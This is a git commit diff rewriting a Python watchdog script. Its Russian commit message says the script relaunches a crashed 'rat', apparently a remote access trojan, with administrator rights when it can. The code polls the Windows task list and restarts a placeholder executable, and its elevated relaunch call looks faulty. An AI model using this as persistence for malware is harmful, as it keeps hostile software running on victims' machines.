7b12402a88889b187cdece853552bd2b22bc94f1
httpshotmaker <80145620+httpshotmaker@users.noreply.github.com>
2022-12-30 17:26:25 +0300

    Update watchdog.py
    Добавлена проверка на то, запущен ли процесс от имени администратора и в случае если да, то перезапускает в случае краша rat от имени администратора

--- watchdog.py
+++ watchdog.py
@@ -1,19 +1,30 @@
+import asyncio
 import subprocess
-import time
+import ctypes
 
-# Имя процесса, который нужно следить
-process_name = "process.exe"
+process_name = "example.exe"  # имя процесса, который нужно проверить
+process_file_path = "C:\\Path\\To\\Process\\File\\example.exe"  # путь к файлу процесса
 
-while True:
-    # Проверяем, запущен ли процесс
-    try:
-        output = subprocess.check_output(["tasklist"])
-        if process_name not in output.decode("utf-8"):
-            # Процесс не запущен, запускаем его
-            subprocess.Popen([process_name])
-    except:
-        # Произошла ошибка при проверке или запуске процесса, игнорируем
-        pass
+async def check_and_restart_process():
+    while True:
+        # проверяем, работает ли процесс
+        result = subprocess.run(["tasklist"], stdout=subprocess.PIPE)
+        output = result.stdout.decode("utf-8").strip()
+        if process_name not in output:
+            # если процесс не работает, то пытаемся его перезапустить
+            try:
+                # проверяем, запущен ли скрипт от имени администратора
+                if ctypes.windll.shell32.IsUserAnAdmin():
+                    # если запущен, то перезапускаем процесс от имени администратора
+                    subprocess.run(["start", "cmd", "/c", "runas", process_file_path])
+                else:
+                    # если не запущен, то перезапускаем процесс обычным способом
+                    subprocess.run([process_file_path])
+            except Exception as e:
+                print(f"Не удалось запустить процесс: {e}")
+        else:
+            print("Процесс уже работает")
 
-    # Ждем некоторое время перед следующей проверкой
-    time.sleep(60)
+        await asyncio.sleep(60)  # ждем 60 секунд перед следующей проверкой
+
+asyncio.run(check_and_restart_process())
